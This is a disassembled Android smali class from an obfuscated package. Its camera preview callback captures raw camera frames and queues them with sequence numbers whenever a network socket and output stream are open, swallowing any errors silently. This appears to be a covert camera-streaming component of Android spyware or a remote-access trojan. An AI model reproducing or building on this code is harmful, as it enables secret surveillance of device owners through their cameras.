.class Lcmf0/c3b5bm90zq/patch/C5$3;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/hardware/Camera$PreviewCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C5;->surfaceChanged(Landroid/view/SurfaceHolder;III)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcmf0/c3b5bm90zq/patch/C5;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C5;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPreviewFrame([BLandroid/hardware/Camera;)V
    .locals 5

    :try_start_0
    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    iget-boolean p2, p2, Lcmf0/c3b5bm90zq/patch/C5;->b:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v0, 0x1

    if-ne p2, v0, :cond_1

    if-nez p1, :cond_0

    return-void

    :cond_0
    :try_start_1
    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p2}, Lcmf0/c3b5bm90zq/patch/C5;->c(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v1

    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p2}, Lcmf0/c3b5bm90zq/patch/C5;->d(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v3

    cmp-long p2, v1, v3

    if-nez p2, :cond_1

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object p2

    if-eqz p2, :cond_1

    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    iget-boolean p2, p2, Lcmf0/c3b5bm90zq/patch/C5;->l:Z

    if-ne p2, v0, :cond_1

    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p2}, Lcmf0/c3b5bm90zq/patch/C5;->b(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/io/OutputStream;

    move-result-object p2

    if-eqz p2, :cond_1

    sget p2, Lcmf0/c3b5bm90zq/patch/C5;->k:I

    const/4 v0, -0x1

    if-eq p2, v0, :cond_1

    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p2}, Lcmf0/c3b5bm90zq/patch/C5;->e(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p2

    invoke-interface {p2, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->f(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p2}, Lcmf0/c3b5bm90zq/patch/C5;->d(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p2

    invoke-interface {p1, p2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    iget-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$3;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p2}, Lcmf0/c3b5bm90zq/patch/C5;->d(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v0

    const-wide/16 v2, 0x1

    add-long/2addr v0, v2

    invoke-static {p1, v0, v1}, Lcmf0/c3b5bm90zq/patch/C5;->a(Lcmf0/c3b5bm90zq/patch/C5;J)J
    :try_end_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_1
    return-void
.end method
